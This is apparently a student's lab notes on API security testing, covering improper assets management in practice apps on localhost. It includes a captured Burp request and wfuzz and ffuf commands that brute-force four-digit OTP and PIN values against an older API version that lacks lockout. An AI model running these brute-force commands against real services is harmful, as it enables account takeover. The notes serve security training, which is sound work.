## APISEC Improper Assets Management

REST APIs should only expose supported endpoints and not expose non-production and/or unsupported endpoints (for example older version endpoints).

Note: Remember to look at headers of responses and requests!

for example:
```
/api/v3/...
/api/v2/...
or
api.test.target.com
/api/private
... so on 
```

When we want to test this we want to run both un-authorized and authorized tests.

In Burp its useful to replace the v2 for example with a {{ver}} that can then be set in an environment as an environment variable, in our case in Test Env.


In the example there is no attempt lock out for v2 but there is one for v3, we can then exploit the v2 with brute forcing to figure out the otp.

From Postman we proxy the POST request of OTP checking to burp, and we set the otp as the attack point. We can then set the payload to check 0000-9999 all combinations, since the otp as seen before is always a simple 4 number combination.
```
POST /identity/api/auth/v2/check-otp HTTP/1.1
Content-Type: application/json
Accept: */*
User-Agent: PostmanRuntime/7.43.0
Postman-Token: 7d777be5-9e85-4d2f-9933-c28b92b15a64
Host: localhost:8888
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 72

{
  "email": "hapihacker@email.com",
  "otp": "ยง<string>ยง",
  "password": "Password1!"
}
```

However, since this takes long in the free Burp, we'll use wfuzz via CLI command:
```
wfuzz -z file,./4-digits-0000-9999.txt \
-d '{"email": "hapihacker@email.com", "otp": "FUZZ", "password": "NewPassword1!"}' \
-H "Content-Type: application/json" http://127.0.0.1:8888/identity/api/auth/v2/check-otp -hc 500
```
Which completes the checkup for OTP combination much faster! (again if we had pro version of Burp Suite we could do this with that instead)

This was an improper authentication test. We can conduct a similar one by grabbing the authentication token, using postman with burp and figuring out what endpoints give us extra information.

The quiz task was to find a similar number combination but instead of otp, it was for pin, this could be achieved with ffuff or wfuzz

ffuff:
```
ffuf -w ./numbers.txt -X POST -d '{"username":"richardbranson","pin":"FUZZ"}' -H "Content-Type: application/json" -u http://127.0.0.1/vapi/api9/v1/user/login -fs 0
```


